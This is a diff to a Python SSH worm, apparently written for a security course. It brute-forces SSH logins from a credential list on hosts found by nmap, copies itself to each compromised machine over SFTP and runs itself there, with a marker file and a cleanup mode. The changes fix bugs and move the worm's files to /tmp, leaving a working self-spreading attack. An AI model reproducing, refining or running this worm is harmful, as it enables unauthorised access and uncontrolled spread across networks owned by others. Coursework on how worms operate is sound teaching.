@@ -4,7 +4,7 @@ import socket
 import nmap
 import netinfo
 import os
-import netifaces
+
 
 # The list of credentials to attempt
 credList = [
@@ -57,14 +57,9 @@ def spreadAndExecute(sshClient):
 	# The code which goes into this function
 	# is very similar to that code.	
 	sftp = sshClient.open_sftp()
-	if sys.argv[2] == '-c' or sys.argv[2] == "--clean":
-		stds = sshClient.exec_command("python /home/cpsc/worm.py -c")
-		sftp.remove(INFECTED_MARKER_FILE)
-		sftp.remove("/home/cpsc/worm.py")
-	else:
-		sftp.put("/home/cpsc/worm.py", "home/cpsc/worm.py")
-		stds1 = sshClient.exec_command("chmod /home/cpsc/worm.py 777")
-		stds2 = sshClient.exec_command("python /home/cpsc/worm.py")
+	sftp.put("/tmp/worm.py", "worm.py")
+	stds1 = sshClient.exec_command("chmod /tmp/worm.py 777")
+	stds2 = sshClient.exec_command("python /tmp/worm.py")
 	sftp.close()
 	sshClient.close()
 
@@ -102,12 +97,12 @@ def tryCredentials(host, userName, password, sshClient):
 	# declaration (if you choose to use
 	# this skeleton).
 	try:
-		sshClient.connect(host,"22",userName,password)
+		sshClient.connect(host,22,userName,password)
 	except socket.error:
-		return None
+		return 3
 	except paramiko.SSHException:
-		return None
-	return sshClient
+		return 1
+	return 0
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -117,6 +112,7 @@ def tryCredentials(host, userName, password, sshClient):
 # If the attack failed, returns a NULL
 ###############################################################
 def attackSystem(host):
+	print "Attempting to connect to " + host
 	
 	# The credential list
 	global credList
@@ -145,10 +141,16 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		attemptResults = tryCredentials(host,username, password,ssh)
-		if attemptResults:
+		if attemptResults == 0:
+			print "Accessed " + host
 			return ssh
+		if attemptResults == 3:
+			print "Server Down or not running SSH"
+		if attemptResults == 1:
+			print "Wrong Credentials"
+
 	# Could not find working credentials
-	return None	
+	print "Could not find working credentials for " + host
 
 ####################################################
 # Returns the IP of the current system
@@ -160,19 +162,14 @@ def getMyIP():
 	
 	# Change this to retrieve and
 	# return the IP of the current system.
-    interfaces = netifaces.interfaces()
     # The IP address
-    for interface in interfaces:
-        # If eth0 or wlan0 not in use, 'addr' will not exist, catch KeyError
-        try:
-            # The IP address of the interface
-            addr = netifaces.ifaddresses(interface)[2][0]['addr'] 
-            # Get the IP address
-            if not addr == "127.0.0.1":
-                # Save the IP address and break
-                return addr
-        except KeyError:
-            continue
+    for dev in netinfo.list_active_devs():
+        # The IP address of the interface
+        addr = netinfo.get_ip(dev)
+        # Get the IP address
+        if not addr == "127.0.0.1":
+            # Save the IP address and break
+            return addr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -217,9 +214,8 @@ def cleaner(sshClient):
 	
 	# remove the infection (i.e. marker file) from the host
 	# remove the worm program from the host
-	sftp = sshClient.open_sftp()
-	sftp.remove("/home/cpsc/worm.py")
-	sftp.remove(INFECTED_MARKER_FILE)
+	stdErrs = sshClient.exec_command("python /tmp/worm.py -c")
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -240,17 +236,13 @@ if len(sys.argv) < 2:
 	if isInfectedSystem():
 		exit
 
-elif sys.argv[2] == '-c' or sys.argv[2] == "--clean":
-	os.remove(INFECTED_MARKER_FILE)
-	os.remove("/home/cpsc/worm.py")
-
-# Get the IP of the current system
+#Get the IP of the current system
 currentIP = getMyIP()
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
 
-# TODO: Remove the IP of the current system
+# Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 networkHosts.remove(currentIP)
@@ -263,10 +255,11 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
-	print sshInfo
 	
 	# Did the attack succeed?
 	if sshInfo:			
+		print "sshInfo: ",
+		print sshInfo
 		print "Trying to spread"
 		
 		# TODO: Check if the system was	
@@ -278,7 +271,7 @@ for host in networkHosts:
 		# This can be done using code similar to
 		# the code below:
 		# try:
-        #	 remotepath = '/tmp/infected.txt'
+	        #	 remotepath = '/tmp/infected.txt'
 		#        localpath = '/home/cpsc/'
 		#	 # Copy the file from the specified
 		#	 # remote path to the specified
@@ -297,22 +290,32 @@ for host in networkHosts:
 		# Otherwise, infect the system and terminate.
 		# Infect that system
 		try:
-			localpath = "/home/cpsc/"
-			sftp = sshInfo[0].open_sftp()
+			localpath = "/tmp"
+			sftp = sshInfo.open_sftp()
 			sftp.get(INFECTED_MARKER_FILE,localpath)
 			# if infectedFile exists, either close sftp or clean
-			if sys.argv[2] == '-c' or sys.argv[2] == "--clean":
-				cleaner(sshInfo[0])
+			if len(sys.argv) >= 2:
+				if sys.argv[1] == '-c' or sys.argv[1] == "--clean":
+					cleaner(sshInfo)
+					print ' ' +  host + ' successfully cleaned'
 			sftp.close()
-			sshInfo[0].close()
+			sshInfo.close()
 		# INFECTED_MARKER_FILE does not exist, spread & Exe
 		except IOError:
-			spreadAndExecute(sshInfo[0])
+			spreadAndExecute(sshInfo)
+			print "worm successfully sent to " + host
+	else:
+		print "No sshInfo"
 	
-if sys.argv[2] == '-c' or sys.argv[2] == "--clean":
-	print "Cleaning complete"
+if len(sys.argv) >=2:
+	if sys.argv[1] == '-c' or sys.argv[1] == "--clean":
+		os.remove(INFECTED_MARKER_FILE)
+		os.remove("/tmp/worm.py")
+		print "Cleaning Complete"
+	else:
+		print " Spreading Complete"
+		exit
 else:
 	markInfected()
-	print "Spreading complete"	
 
 
